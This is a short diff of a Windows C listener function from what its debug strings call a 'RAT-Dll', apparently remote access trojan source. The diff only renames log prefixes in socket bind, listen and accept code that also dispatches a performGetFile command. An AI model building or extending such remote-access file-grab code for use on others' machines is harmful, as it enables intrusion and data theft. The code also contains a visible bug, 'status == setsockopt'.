@@ -24,7 +24,7 @@ INT startListen()
     status = WSAStartup(wsaVersion, &wsaData);
     if (status != SUCCESS)
     {
-        sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Failed WSAStartup! Error code %u\n", status);
+        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed WSAStartup! Error code %u\n", status);
         OutputDebugStringA(msgBuf);
         goto cleanup;
     }
@@ -42,7 +42,7 @@ INT startListen()
     serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (serverSock == INVALID_SOCKET)
     {
-        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to create socket! \n");
+        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to create socket! \n");
         status = WSAGetLastError();
         goto cleanup;
     }
@@ -50,7 +50,7 @@ INT startListen()
     status = bind(serverSock, (LPSOCKADDR)&client, sizeof(client));
     if (status == SOCKET_ERROR)
     {
-        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to bind to socket! \n");
+        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to bind to socket! \n");
         status = WSAGetLastError();
         goto cleanup;
      }
@@ -59,18 +59,18 @@ INT startListen()
     status == setsockopt(serverSock, SOL_SOCKET, SO_KEEPALIVE, (char*)bOptVal, bOptLen);
     if (status == SOCKET_ERROR)
     {
-        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to set keepalive options! \n");
+        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to set keepalive options! \n");
         status = WSAGetLastError();
         goto cleanup;
     }
         
-    sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Listening on port %u\n", PORT_NUM);
+    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Listening on port %u\n", PORT_NUM);
     OutputDebugStringA(msgBuf);
 
     status = listen(serverSock, SOMAXCONN);
     if (status == SOCKET_ERROR)
     {
-        OutputDebugStringA("RAT-Dll-Main::startListen - Socket error ! \n");
+        OutputDebugStringA("RAT-Dll-Connect::startListen - Socket error ! \n");
         // TODO - move this to cleanup? check if socket is open anyway first 
         closesocket(serverSock);
         WSACleanup();
@@ -80,7 +80,7 @@ INT startListen()
     clientSock = accept(serverSock, NULL, NULL);
     if (clientSock == INVALID_SOCKET)
     {
-        OutputDebugStringA("RAT-Dll-Main::startListen - Invalid socket from client! \n");
+        OutputDebugStringA("RAT-Dll-Connect::startListen - Invalid socket from client! \n");
         // TODO - move this to cleanup? check if socket is open anyway first 
         closesocket(serverSock);
         WSACleanup();
@@ -112,7 +112,7 @@ INT startListen()
                      status = performGetFile((const char*)&recvBuf, fileBytes);
                      if (status != SUCCESS)
                      {
-                         sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Failure recevied from performGetFile %d\n", status);
+                         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performGetFile %d\n", status);
                          OutputDebugStringA(msgBuf);
                          goto cleanup;
                      }
